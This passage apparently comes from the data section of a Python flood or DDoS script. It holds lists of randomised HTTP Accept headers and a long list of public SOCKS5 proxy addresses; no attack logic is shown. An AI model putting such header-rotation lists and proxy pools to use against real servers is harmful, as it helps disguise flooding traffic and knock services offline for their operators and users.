     'Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n',
     'Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
     'Accept: text/html, application/xhtml+xml',
     'Accept-Language: en-US,en;q=0.5\r\n',
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n',
     'Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
     'Accept-Encoding: gzip, deflate\r\n',
     'Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
     'Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n',
     'Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n',
     'Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n',
     'Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
     'Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n',
     'Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
     'Accept: text/html, application/xhtml+xml',
     'Accept-Language: en-US,en;q=0.5\r\n',
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n',
     'Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n']

acceptall = [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
    'Accept-Encoding: gzip, deflate\r\n',
    'Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
    'Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n',
    'Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n',
    'Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n',
    'Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
    'Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n',
    'Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
    'Accept: text/html, application/xhtml+xml',
    'Accept-Language: en-US,en;q=0.5\r\n',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n',
    'Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n'
]
socks5 = [
 """221.211.62.6:1111
99.137.180.50:5004
113.9.157.29:7302
191.97.8.252:999
36.92.43.107:8080
20.194.122.134:9090
70.185.68.155:4145
120.79.183.72:1080
157.245.28.79:53749
204.101.61.81:4145
92.42.109.189:1080
36.66.16.193:80
47.112.216.65:18181
209.58.150.221:45579
191.252.220.251:3128
115.89.177.92:1081
113.204.169.70:7302
103.220.206.110:59570
186.29.163.97:49787
186.97.156.130:999
176.103.51.24:16642
193.112.118.176:52018
103.240.168.138:6666
185.200.38.231:10820
154.239.7.69:8080
120.24.183.17:1080
122.116.124.83:5678
39.165.98.152:7302
122.193.18.144:7302
39.108.70.119:1080
42.51.129.83:10081
222.92.207.98:40086
138.3.223.120:3128
117.84.154.90:8902
202.107.84.73:7302
152.231.25.114:8080
117.185.45.186:7302
138.197.193.107:9050
125.79.14.194:4216
213.32.62.217:1080
221.214.109.166:7300
51.79.52.80:3080
66.135.227.178:4145
58.242.239.250:7302
41.65.236.43:1981
103.76.253.66:3129
61.90.185.170:7302
164.70.77.211:3128
193.41.88.58:53281
106.14.1.3:10080
23.254.215.88:10007
218.89.4.27:7302
122.193.18.133:7302
119.23.213.79:1080
183.214.79.119:7302
222.217.74.84:7300
176.119.159.63:1080
114.93.190.61:7891
190.205.42.46:999
218.23.220.156:7302
184.82.128.211:8080
218.108.110.210:7302
120.24.193.205:1080
45.225.184.177:999
138.204.68.42:1337
121.43.172.193:5555
120.76.136.14:1080
168.63.141.55:44270
59.120.147.82:3128
103.11.106.209:8181
103.146.222.2:84
122.227.236.123:7302
192.111.137.37:18762
115.56.240.254:7302
179.1.65.98:999
192.111.135.21:4145
218.16.65.247:7302
122.144.129.9:20086
120.43.95.74:7300
114.253.17.134:1080
192.210.232.74:33042
183.88.212.184:8080
59.59.6.86:7302
121.42.9.57:57223
1.13.165.87:8080
183.87.153.98:49602
183.66.144.58:7302
61.160.223.141:7302
69.163.161.235:52337
39.97.180.145:7890
103.142.21.197:8080
103.109.2.76:8080
39.108.104.232:1080
47.106.242.127:1080
124.225.116.119:7302
116.212.156.131:33427
41.65.36.167:1981
36.133.202.102:81
94.228.192.197:8087
222.74.65.122:7302
113.105.134.214:7302
60.174.116.164:7302
39.108.156.107:1080
78.38.108.194:1080
123.234.135.97:1111
217.195.203.28:3130
164.70.72.55:3128
85.25.91.161:5577
147.182.240.49:11422
41.65.181.133:8089
223.27.194.66:63141
129.146.18.152:20000
159.65.229.246:24450
42.248.126.214:8902
13.233.10.152:9050
72.221.196.145:4145
178.79.161.73:32714
39.152.112.205:7302
110.249.150.46:7302
221.234.9.242:7302
109.201.9.100:8080
88.255.106.26:8080
64.17.30.238:63141
131.72.69.34:45005
111.21.186.102:7302
180.167.238.98:7302
101.109.251.42:4145
1.4.214.148:5678
1.179.130.201:4153
1.1.184.187:4145
1.179.145.101:33109
101.35.115.136:20012
1.9.167.35:60489
1.20.96.164:4153
110.34.166.183:4153
111.125.153.130:5678
110.232.78.55:5678
110.235.255.179:5678
110.139.128.232:4145
110.78.146.235:5678
110.78.168.8:4145
110.76.129.229:5678
131.0.246.113:4153
131.221.165.53:4153
136.243.106.188:10081
132.255.109.227:4153
130.185.213.146:5678
131.0.143.1:4145
130.193.123.34:5678
131.72.202.137:1080
174.77.111.197:4145
176.31.69.33:19598
174.64.199.82:4145
175.100.18.45:41575
174.75.211.222:4145
175.139.179.65:41527
173.212.248.58:3155
174.77.111.196:4145
183.88.219.206:34676
183.234.24.70:1081
185.138.230.68:5678
184.178.172.13:15311
183.62.58.36:1080
184.178.172.18:15280
183.89.249.192:4153
183.173.183.90:7890
195.117.107.190:4145
195.242.138.20:5678
194.12.124.188:3629
197.156.240.66:5678
196.0.111.186:46048
194.44.85.38:1088
195.205.33.237:5678
194.152.134.35:5678
31.135.97.67:4145
24.139.143.226:4153
27.50.23.206:51372
24.249.199.4:4145
27.147.241.134:10800
24.103.162.189:31337
27.118.21.13:5678
27.74.243.242:5678
45.182.115.119:4153
45.230.8.19:5678
45.182.115.101:4153
45.189.184.39:4145
45.182.115.24:4153
45.182.115.31:4153
45.7.210.194:4153
45.249.101.4:56457
72.195.114.184:4145
68.71.249.153:48606
65.21.34.194:9050
70.166.167.55:57745
66.135.227.181:4145
72.221.196.145:4145
72.206.181.97:64943
66.42.224.229:41679
103.114.98.206:5678
102.176.180.22:4153
102.39.21.146:5678
1.179.148.9:36476
1.186.213.67:5678
103.107.68.185:5430
101.95.182.26:5678
102.223.166.1:3629
113.108.247.146:20086
112.14.47.6:57545
110.77.149.50:5678
110.50.85.162:4145
110.40.141.79:10808
111.67.71.52:4145
111.90.175.13:5678
113.160.16.142:5678
131.255.184.28:5678
131.72.202.225:1080
137.220.176.177:8080
139.162.241.44:12768
134.73.225.236:16883
134.209.23.68:64371
138.201.107.232:9050
143.202.136.49:5678
176.118.51.82:3629
177.105.68.179:4153
175.158.42.207:5678
175.100.72.95:55360
175.106.17.222:43409
176.113.209.13:1080
174.64.199.79:4145
176.115.15.198:5678
184.178.172.14:4145
183.88.237.134:5678
185.171.54.34:4153
184.178.172.25:15291
184.185.2.190:4145
184.178.172.28:15294
184.179.216.133:24630
183.88.212.247:1080
195.206.34.215:40674
197.234.13.9:4145
195.128.141.1:4153
197.214.10.30:5678
196.25.43.30:5678
195.64.162.175:3629
196.0.28.4:5678
196.50.7.11:4153
31.146.161.194:5678
24.37.245.42:51056
31.171.169.94:5678
27.123.1.33:4153
31.173.140.183:3629
24.249.199.12:4145
36.67.245.165:5678
31.13.198.149:10801
45.201.132.232:5678
45.63.117.130:9050
45.221.231.4:5678
45.7.56.192:4153
45.228.61.26:4153
45.186.150.16:5678
45.7.247.188:4153
46.107.230.122:1080
72.206.181.103:4145
69.61.200.104:36181
72.217.216.239:4145
72.195.34.58:4145
67.204.1.222:64312
77.50.75.238:4153
72.210.252.134:46164
66.76.33.5:5678
103.12.246.57:4145
103.101.134.93:5678
102.66.232.198:5678
1.212.157.115:4145
1.186.82.4:5678
103.122.98.246:4153
102.134.17.14:5678
103.102.144.244:5678
113.162.84.128:1080
112.163.21.154:23386
113.160.247.189:4145
114.108.177.104:60984
111.92.241.222:5678
118.98.65.147:4153
114.69.232.117:4145
113.160.227.247:5678
138.99.93.62:4145
134.73.80.194:16883
138.19.193.114:65528
139.255.86.226:5678
14.160.3.78:5678
138.219.50.170:4145
142.4.207.10:48012
144.76.224.49:46107
176.197.5.218:4153
177.105.68.63:4153
176.105.219.2:3629
176.192.8.206:61339
176.215.191.177:3629
176.193.113.57:5678
177.105.68.118:4153
176.122.210.190:33555
185.17.132.158:4145
184.179.216.130:4145
185.189.208.129:4153
185.126.47.75:5678
185.186.17.57:5678
184.178.172.5:15303
184.181.217.210:4145
185.184.197.98:5678
197.234.13.93:4145
200.97.6.245:4153
195.210.172.46:58350
197.253.58.89:5678
197.159.0.214:48506
196.27.105.130:4153
197.250.15.87:5678
196.6.234.140:4153
36.95.171.107:5678
27.115.33.94:4153
31.28.99.25:55767
27.123.5.26:5678
36.67.88.77:4153
31.206.38.50:37630
36.91.145.5:5678
31.206.38.49:37630
45.228.136.169:5678
45.7.176.126:39867
45.5.152.232:37762
45.71.148.151:4651
45.7.177.178:39867
45.7.177.238:39867
46.229.55.38:9050
46.151.83.231:5678
72.206.181.123:4145
70.166.167.36:4145
72.223.168.86:57481
72.223.168.73:57494
70.60.230.1:32940
77.65.118.57:5678
72.221.232.155:4145
67.201.33.10:25283
103.132.3.254:5678
103.103.52.46:4153
103.108.144.142:5678
101.51.121.203:4153
1.9.164.242:35471
103.127.104.77:5678
103.109.59.209:1080
103.103.192.121:4145
116.206.61.179:5678
113.160.165.164:1080
113.162.84.129:1080
115.75.1.156:50152
113.161.254.4:1080
118.99.67.236:5678
116.48.133.94:40086
113.53.247.221:4153
14.224.172.179:5678
134.73.81.205:16883
138.197.217.238:9050
14.102.19.50:5678
142.4.207.10:5518
14.248.82.22:5678
150.129.52.74:6667
150.107.207.137:57230
176.236.163.34:59311
177.128.120.85:5678
176.123.56.58:3629
176.197.103.58:4145
176.98.95.132:1080
176.236.222.15:1080
177.105.68.204:4153
176.236.37.132:1080
186.1.189.6:4153
185.103.14.155:4153
185.216.18.138:44550
185.161.245.1:1080
185.189.208.65:4153
185.136.150.252:4145
185.125.122.237:5678
185.51.92.108:51327
198.0.198.132:54321
201.144.20.231:5678
197.211.24.206:5678
198.8.94.170:4145
197.231.196.156:37765
197.82.166.158:1080
200.0.247.242:5678
197.136.148.10:5678
37.17.160.169:5678
27.123.4.238:5678
36.138.166.30:81
27.147.185.73:5678
36.71.150.135:5678
31.223.22.25:1080
36.91.58.47:5678
36.67.45.71:1085
45.6.228.178:4145
45.7.177.198:39867
45.5.194.138:22222
49.0.44.42:61393
45.70.206.41:4145
45.70.30.196:34534
46.250.33.222:4145
46.225.241.19:4145
77.89.204.254:4145
70.166.167.38:57728
77.46.138.33:33608
78.189.20.150:5678
72.206.181.105:64935
78.186.111.34:1080
77.108.90.3:1099
67.205.183.80:63922
103.134.18.130:5430
103.12.150.254:37983
103.110.11.206:5678
101.51.121.3:4153
102.128.173.1:5678
103.129.92.44:5678
103.115.255.193:36331
103.103.192.126:4145
117.102.102.155:4153
115.127.23.165:35294
114.96.77.41:5678
115.85.93.178:5678
114.242.116.54:4145
119.29.48.249:8888
116.68.162.106:1080
114.110.22.126:1080
149.20.253.250:12551
138.197.193.107:9050
139.255.104.154:5678
14.248.80.34:5678
151.0.173.145:59729
142.4.207.10:53579
155.133.83.161:58351
159.224.243.185:61303
177.12.177.21:4153
177.207.192.137:4145
176.236.30.153:5678
177.105.68.14:4153
177.101.135.84:5678
176.36.20.67:35356
177.105.68.71:4153
177.10.202.107:1080
186.159.17.194:5678
185.113.6.254:4145
185.34.20.65:4145
185.56.180.14:5678
185.208.100.72:4145
185.171.54.36:4153
185.171.52.130:5678
185.61.92.207:39949
200.105.71.114:5678
202.165.32.129:5678
201.184.152.138:44742
200.125.202.74:5678
200.125.44.242:4145
20.52.154.79:9050
200.0.247.84:4153
197.157.219.169:4145
41.190.232.52:36926
27.147.164.86:5678
36.37.71.84:5430
36.37.251.171:5678
36.91.45.10:51299
36.37.189.64:5678
36.95.173.178:4153
36.92.125.163:1080
45.61.185.240:26940
45.7.210.200:4153
45.7.56.197:4153
49.156.39.162:5678
49.156.38.126:5678
46.219.80.142:45237
49.248.32.110:41363
49.156.152.189:5678
78.38.67.80:4145
70.185.68.155:4145
82.207.20.247:5678
79.124.72.199:4153
72.221.196.157:35904
79.106.224.206:5678
77.238.209.58:5678
72.221.172.203:4145
103.134.38.102:1080
103.143.8.126:5678
103.113.3.146:4145
103.10.210.17:44550
102.176.160.70:5678
103.156.147.15:5678
103.124.46.46:5678
103.106.217.130:4145
117.206.83.142:44550
116.90.211.32:5678
118.67.223.4:5678
116.90.229.186:47694
114.6.87.177:36732
119.93.123.229:4145
117.242.147.5:4153
114.132.220.223:10808
163.53.84.216:5678
138.197.208.39:9050
14.32.136.4:14153
144.76.84.38:63643
154.159.245.94:5678
143.255.108.173:4153
162.243.140.82:8086
165.227.119.98:42223
177.203.48.179:4145
177.7.17.230:4145
177.105.68.146:4153
177.128.115.229:4153
177.105.68.62:4153
177.105.68.194:4153
177.128.115.207:4153
177.184.67.69:4145
186.219.214.94:51372
185.134.96.234:33141
185.94.218.57:44421
185.66.57.165:42647
185.40.80.143:4153
185.203.169.224:1080
185.190.90.2:4145
185.66.57.132:42647
200.29.120.4:5678
202.169.246.55:4145
201.236.185.14:5678
200.218.240.9:5678
200.163.135.52:4153
200.0.247.85:4153
200.27.110.29:57702
197.157.254.162:4145
43.245.217.254:5678
27.42.168.46:61308
36.89.17.227:1080
36.89.10.51:44268
36.92.138.51:5678
36.67.63.239:38071
37.26.86.206:4145
36.95.154.11:5678
45.7.177.179:39867
46.101.103.161:25799
45.70.169.50:5678
5.130.72.170:5678
49.51.74.195:21127
46.228.59.248:6789
5.141.81.106:44271
5.152.86.46:14888
80.80.167.246:10801
72.210.252.137:4145
84.44.2.10:4153
79.143.180.109:63640
72.49.49.11:31034
85.198.106.70:1080
78.44.245.186:5678
77.235.221.111:1080
103.137.124.17:55492
103.156.17.62:1080
103.121.215.34:40927
103.115.255.102:36331
102.38.50.62:4153
103.196.56.108:5678
103.124.55.106:5678
103.115.255.94:36331
119.148.4.242:5678
117.198.218.134:3629
119.18.147.81:4153
117.102.72.116:4153
114.69.232.73:4145
120.88.34.92:5678
117.79.80.91:4145
114.69.232.101:4145
167.99.12.224:22564
139.59.79.64:25838
142.4.207.10:14632
149.20.253.51:12551
154.73.133.42:5678
149.129.39.3:31316
164.40.250.71:5678
170.238.180.21:4145
177.223.22.230:4153
177.73.248.18:55226
177.105.68.153:4153
177.129.190.66:4153
177.128.198.26:4153
177.105.68.203:4153
177.136.34.26:4153
177.74.136.33:5678
187.11.232.71:4153
185.136.192.81:4000
186.216.195.124:4153
185.66.59.211:42647
185.49.240.153:3629
185.22.31.227:4153
185.252.41.8:5678
185.66.59.221:42647
200.39.150.6:4153
202.6.224.50:1080
202.123.178.98:5678
200.8.18.194:443
200.29.176.173:4145
200.111.161.75:5678
200.27.18.138:40210
197.232.2.18:5678
45.114.70.164:3629
31.24.205.70:4153
36.89.252.90:5678
36.94.83.71:5678
36.95.101.29:3629
36.94.130.66:5678
38.133.200.94:31596
36.95.154.43:5678
45.7.177.237:39867
46.101.235.163:46107
45.71.195.150:4145
5.133.24.167:5678
50.237.206.174:64312
46.29.10.43:4153
5.141.86.233:60705
5.8.190.219:5678
80.89.137.210:4145
72.221.164.34:60671
84.53.239.95:4145
79.175.107.169:1080
78.158.160.137:60003
88.199.82.68:54194
8.42.71.226:39593
77.89.201.187:4153
103.137.193.51:5678
103.164.110.138:3389
103.127.56.81:5678
103.116.203.242:40927
103.105.40.1:4145
103.215.148.17:43928
103.144.188.1:5678
103.120.202.53:5678
119.18.159.6:4145
117.198.221.34:4153
120.88.35.26:5678
117.202.20.66:1088
117.102.115.154:4153
122.248.46.26:4145
119.18.159.14:5678
115.200.14.182:7890
168.181.63.243:5678
141.138.182.195:5678
143.202.136.55:4153
154.66.125.34:5678
154.81.174.41:1080
152.171.101.103:5678
168.181.196.33:4145
170.81.140.79:61437
179.60.243.38:48699
177.85.205.173:3629
177.105.68.154:4153
177.222.146.125:5678
177.139.130.157:4153
177.105.68.239:4153
177.67.14.173:35914
177.85.53.29:5678
187.157.30.202:4153
185.81.106.52:3629
186.225.36.122:5678
185.79.241.38:5678
185.66.57.163:42647
185.234.72.65:9050
186.121.214.250:5678
186.0.231.73:5678
200.81.144.9:1080
203.188.242.222:4145
202.131.235.138:4153
201.140.116.170:4153
200.3.173.140:5678
200.58.212.19:14888
200.46.30.210:4153
197.234.13.81:4145
36.66.43.157:5678
36.92.197.99:5678
36.95.154.249:5678
37.238.134.130:31772
37.205.81.48:3629
39.119.103.113:40086
37.111.50.251:4153
46.19.141.98:9050
46.173.35.229:3629
46.101.235.163:48478
5.83.104.158:4153
50.62.30.5:53241
46.8.247.3:38279
50.250.75.153:39593
51.83.140.70:8181
81.95.135.130:4153
77.232.150.107:4153
85.132.8.106:4153
80.191.169.79:4145
80.191.248.14:64251
89.203.220.110:4153
80.90.238.45:10809
103.144.91.35:4153
103.199.158.113:41610
103.139.246.166:5678
103.12.246.65:4145
103.105.70.9:30538
103.227.252.66:1080
103.159.21.98:5678
103.14.251.123:4145
119.42.123.144:4145
117.79.80.93:4145
122.116.29.68:4145
118.140.244.240:38157
117.158.195.135:1080
123.231.141.45:5678
119.92.71.123:5678
116.66.205.50:5678
168.205.216.93:4145
142.93.243.235:16355
150.129.171.35:41889
157.119.201.98:1080
155.0.202.254:51327
154.66.245.47:54925
168.227.158.65:4145
171.103.33.126:5678
181.114.232.57:31337
177.86.64.1:3629
177.12.177.69:4153
177.85.205.177:3629
177.207.165.218:5678
177.128.115.220:4153
177.72.82.9:5678
181.115.152.114:4153
188.255.235.9:1080
186.148.189.235:4145
186.42.174.162:51995
186.179.68.196:5678
185.66.59.239:42647
185.47.184.253:45463
186.232.51.25:31337
186.235.187.14:4153
201.148.23.225:1080
203.202.253.186:58309
202.163.113.240:1080
201.159.99.18:31337
201.140.238.231:5678
202.169.235.248:30034
201.148.23.131:1080
197.234.13.86:4145
78.152.119.50:1088
36.67.199.163:5678
36.95.245.81:5678
36.95.158.197:5678
38.142.63.146:31596
41.162.108.180:5678
41.170.65.40:4153
37.122.161.216:4145
46.227.37.161:1088
47.115.149.82:443
47.57.115.226:9050
5.83.104.2:4153
58.215.201.98:38596
47.180.63.37:54321
50.47.75.220:5678
58.32.206.226:58404
82.207.56.202:4145
77.89.251.138:4145
85.185.152.155:4145
80.191.185.156:5678
80.191.248.52:64251
89.250.144.79:4145
81.201.63.13:15509
103.147.4.2:8080
103.207.8.82:5678
103.146.184.62:1085
103.120.153.30:9999
103.122.64.229:1080
103.24.74.102:4153
103.199.155.26:1080
103.156.17.56:5678
123.56.115.59:1080
119.82.242.58:4145
123.108.98.108:5678
118.173.225.65:4153
118.174.65.251:4145
124.41.252.31:5678
123.253.124.28:5678
118.127.117.214:5678
168.228.224.67:3629
143.255.178.1:4153
152.160.144.129:1080
159.203.33.4:7108
158.58.133.187:54266
155.133.83.169:58351
170.244.0.179:4145
181.129.147.27:37251
178.169.71.20:3629
177.131.119.193:5678
177.85.205.29:3629
177.36.185.178:5678
177.128.44.130:31337
177.85.156.160:4153
181.129.62.2:47377
188.255.244.201:1080
186.211.100.145:5678
186.97.233.58:5678
186.251.255.185:31337
185.89.181.212:5678
185.66.59.4:42647
187.16.255.69:4153
186.249.240.146:50733
201.221.128.154:5678
206.189.92.74:7777
203.189.154.151:1080
201.206.141.102:6969
201.144.8.114:5678
202.21.116.210:4153
201.221.133.122:5678
197.255.253.33:5678
78.29.4.218:4145
36.67.27.205:35159
37.34.75.219:4145
36.95.201.15:5678
45.112.1.161:4145
41.72.214.14:5678
41.215.33.186:4145
37.17.53.108:3629
46.227.37.177:1088
47.24.41.226:5678
58.65.167.165:4145
5.172.188.93:5678
61.183.87.194:5678
59.36.136.238:1080
83.220.234.102:5678
81.218.45.150:5678
89.19.115.55:6655
80.80.167.22:10801
103.155.169.19:5678
103.211.8.173:52616
103.151.140.190:5678
103.124.137.158:1080
103.127.63.57:5678
103.240.33.33:8291
103.205.130.94:4145
103.167.170.62:1080
124.158.168.22:5678
119.84.69.182:1080
118.97.119.98:4153
118.97.191.233:4153
125.141.139.110:5566
123.57.26.118:1080
119.18.152.138:4145
170.233.117.32:4153
149.20.253.103:12551
154.239.6.163:5678
159.65.229.246:25447
158.69.225.124:2021
163.53.209.7:6667
170.82.180.120:4153
82.103.118.42:1099
181.49.3.114:3629
181.111.247.3:4153
177.220.243.130:4153
177.91.96.120:5678
177.36.185.182:5678
177.137.227.14:4145
177.91.76.34:4153
182.53.197.156:43574
188.93.64.242:4153
186.219.96.12:52017
187.120.241.81:3629
187.243.253.182:43015
186.64.81.1:5678
185.89.180.151:4145
187.190.64.42:35045
186.251.255.21:31337
201.221.129.134:5678
209.13.96.165:39921
206.192.226.90:39593
202.131.246.250:5678
201.33.161.237:4153
202.46.154.20:5678
202.138.239.120:62102
200.105.192.6:5678
80.80.162.81:10805
36.95.106.73:5678
41.139.170.175:5678
37.26.136.224:4153
45.116.114.21:5678
43.224.10.11:6667
41.71.63.22:5678
37.209.248.212:4153
46.32.2.158:4145
49.156.42.186:5678
91.150.77.58:56921
80.71.112.98:55243
62.133.135.129:4153
50.84.203.98:5678
62.63.157.106:4153
59.42.62.181:9080
85.132.8.221:4153
81.23.3.237:3629
89.228.128.216:5678
103.206.119.27:4145
103.227.145.78:5430
103.163.36.185:4145
103.124.137.251:1080
103.143.84.72:44550
103.241.227.108:6667
103.236.161.29:5430
103.18.163.194:5678
124.41.225.251:5678
12.131.149.6:30504
81.199.89.88:1088
122.55.202.100:4145
119.18.154.196:4145
124.105.29.181:13629
122.154.100.89:5678
170.246.69.243:4145
149.56.44.70:30928
154.73.85.133:57932
160.202.41.194:4153
158.69.64.142:9200
168.181.123.208:1080
82.137.250.156:4145
181.78.24.29:5678
181.115.232.158:4153
177.23.184.166:4145
178.115.236.219:5678
178.156.62.185:5678
177.184.67.13:4145
177.93.72.38:4153
182.53.96.56:4145
190.109.2.83:4145
186.24.50.164:4145
187.177.30.154:4145
187.72.172.109:5678
186.64.81.7:5678
186.64.81.5:5678
188.247.39.14:43032
187.210.136.88:4153
201.222.81.33:5678
210.56.252.9:4145
210.211.122.196:1080
202.133.2.214:4153
201.48.62.65:4145
202.58.199.229:5678
202.148.26.122:5678
200.11.140.62:5678
81.177.142.19:1080
36.95.210.67:5678
41.74.4.166:4153
41.207.85.93:5678
45.117.83.62:4040
43.252.9.182:5678
45.122.44.2:5678
38.91.106.223:13653
50.204.174.52:60285
49.231.0.178:55860
91.198.137.31:3514
80.78.73.91:1080
62.201.220.50:60212
50.96.204.6:18351
61.8.75.186:1080
103.212.93.217:45639
103.235.199.46:5678
103.203.176.2:8291
103.125.117.202:4145
103.144.18.198:5678
103.25.123.193:44550
103.236.161.65:5430
103.199.159.217:41610
124.41.240.203:37704
121.200.60.122:4153
82.117.247.76:31080
124.107.37.51:5678
121.65.173.82:4145
91.193.252.112:57296
125.141.139.197:5566
125.141.139.55:5566
170.246.85.109:37163
151.252.109.241:5678
157.245.90.60:48440
165.227.104.122:39047
168.227.158.29:4145
168.232.122.35:5678
82.137.224.193:8291
82.99.203.78:58523
182.75.132.106:5678
181.143.204.98:5678
177.72.112.249:31164
178.205.251.134:4153
179.108.158.204:4145
177.200.86.138:5678
178.218.105.29:5678
190.110.183.22:4153
186.97.172.178:5678
187.86.129.132:63253
188.165.254.122:9420
187.102.16.66:51327
187.19.127.253:4153
190.239.24.70:5678
187.32.20.249:5678
202.159.60.65:443
212.220.13.98:4153
210.4.72.94:5678
202.137.24.18:7890
202.21.114.134:4153
203.12.200.32:1090
202.159.35.41:443
200.192.236.242:1080
82.103.116.126:4153
36.95.53.185:5678
43.245.94.242:4153
43.248.24.234:4145
45.112.125.58:4145
45.125.222.125:47239
41.190.57.57:5678
50.236.148.246:31699
49.51.74.61:21127
91.209.114.78:5678
80.80.164.164:10801
62.33.235.40:4153
58.187.1.241:5678
103.239.165.29:5678
103.242.104.244:5678
103.21.163.70:6667
103.139.163.219:4153
103.158.124.30:5678
103.251.83.14:44550
103.239.6.246:5678
103.229.85.205:4145
125.228.143.207:4145
125.25.165.58:4153
84.21.109.150:1080
125.141.133.47:5566
125.213.194.26:5678
91.198.137.31:3527
125.20.48.62:3629
170.80.91.14:4145
154.117.134.214:4153
159.65.229.246:24450
167.71.172.18:9050
168.90.65.125:4153
170.244.64.198:31476
82.142.135.10:4145
84.2.233.239:4153
182.75.30.6:5678
182.52.32.11:4153
178.128.156.11:48511
178.213.146.235:1080
180.180.171.113:4145
177.223.48.126:52104
178.62.62.139:21398
62.175.182.156:5678
190.205.32.146:5678
187.122.248.194:5678
188.127.250.62:10001
188.255.244.37:1080
188.143.235.130:7777
187.60.66.45:5678
190.98.189.228:5678
187.44.167.78:47074
202.51.118.42:4145
222.191.243.187:45730
213.135.12.27:5678
202.141.226.124:48644
202.40.177.94:5678
203.142.81.107:5678
202.53.141.186:5678
200.52.144.170:33865
89.133.95.177:4145
37.17.9.28:36095
45.174.71.20:1080
85.159.27.112:3629
45.113.80.37:9050
41.191.226.86:5678
62.244.227.65:4153
5.153.140.179:4145
91.226.51.200:4145
103.242.107.241:4145
103.242.175.115:1080
103.211.8.113:52616
103.14.251.23:4153
103.162.196.90:5678
103.30.115.100:5678
103.250.166.04:6667
103.239.255.130:5678
125.254.65.130:4145
85.135.95.218:4145
125.141.133.48:5566
125.25.57.76:4145
91.198.137.31:3542
59.127.142.50:1088
128.199.138.28:64973
154.212.5.190:5678
159.69.204.95:9100
167.99.87.173:1080
170.246.69.145:4145
170.247.43.142:32812
82.207.59.154:3629
88.255.64.93:1080
182.92.205.113:1080
182.92.214.1:1080
179.191.15.110:5678
178.215.163.218:4145
180.211.158.90:5678
177.54.201.168:51735
178.72.162.242:4153
62.182.114.164:59623
190.4.204.163:4145
187.141.129.86:4153
188.43.20.173:4153
190.119.168.116:5678
188.170.237.214:3629
188.0.184.78:54483
